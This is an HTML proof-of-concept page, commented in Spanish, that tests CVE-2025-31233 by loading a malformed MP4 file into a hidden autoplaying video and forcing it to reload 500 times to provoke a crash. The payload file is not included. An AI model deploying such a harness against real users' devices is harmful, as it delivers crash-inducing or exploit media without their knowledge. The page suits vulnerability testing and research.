<!DOCTYPE html>
<html>
<head>
  <title>MP4 Exploit Test - CVE-2025-31233</title>
  <style>
    body {
      background: #000;
      color: #0f0;
      font-family: monospace;
      padding: 1em;
    }
    #log {
      white-space: pre-wrap;
    }
    video {
      display: none; /* oculto para evitar render visual */
    }
  </style>
</head>
<body>
  <h2>🎬 CVE-2025-31233 - MP4 Malformed Exploit Test</h2>
  <div id="log">[+] Cargando video malformado...</div>

  <video id="evilVideo" loop autoplay muted></video>

  <script>
    const log = msg => {
      document.getElementById("log").textContent += "\n" + msg;
      console.log(msg);
    };

    const video = document.getElementById("evilVideo");
    video.src = "corrupted_payload.mp4";

    video.oncanplay = () => {
      log("[+] Video cargado y listo para reproducir.");
    };

    video.onerror = () => {
      log("[!] Error al reproducir video. Podría ser signo de corrupción o mitigación activa.");
    };

    video.onended = () => {
      log("[!] Video terminó inesperadamente. ¿Crash parcial?");
    };

    let attempts = 0;
    function spamReload() {
      video.load();
      attempts++;
      if (attempts < 500) {
        setTimeout(spamReload, 100);
      } else {
        log("[+] Finalizó ciclo de reproducción forzada.");
      }
    }

    setTimeout(spamReload, 1500);
  </script>
</body>
</html>
